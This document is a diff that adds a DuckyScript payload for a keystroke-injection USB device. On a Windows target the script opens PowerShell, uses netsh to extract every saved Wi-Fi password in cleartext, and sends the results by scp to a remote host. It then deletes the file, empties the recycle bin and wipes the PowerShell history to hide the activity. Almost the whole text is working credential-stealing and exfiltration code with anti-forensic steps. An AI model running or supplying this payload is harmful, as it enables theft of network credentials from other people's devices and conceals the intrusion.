@@ -1,0 +1,36 @@
+REM Script to dump saved wifi credentials on target device
+
+DELAY 2000
+
+REM Open Powershell
+GUI r
+STRING powershell
+ENTER
+
+DELAY 500
+
+REM Execute command to extract saved wifi credentials
+STRING $creds = (netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=clear)} | Select-String “Key Content\W+\:(.+)$” | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
+ENTER
+STRING echo $creds >> $env:TMP\$env:COMPUTERNAME_$env:USERNAME.txt
+ENTER
+
+REM Send the file to remote machine over ssh using scp
+STRING scp $env:TMP\$env:COMPUTERNAME_$env:USERNAME.txt USER@REMOTE_IP:/PATH/TO/REMOTE_MACHINE_DIR/
+ENTER
+DELAY 300
+STRING SCP_PASSWORD
+ENTER
+DELAY 300
+
+REM Removing trace of activity
+
+REM Deletes the file created from the file system and recycle bin and clears powershell history silently
+STRING rm $env:TEMP\$env:COMPUTERNAME_$env:USERNAME.txt -Force -ErrorAction SilentlyContinue
+ENTER
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+ENTER
+STRING exit
+ENTER
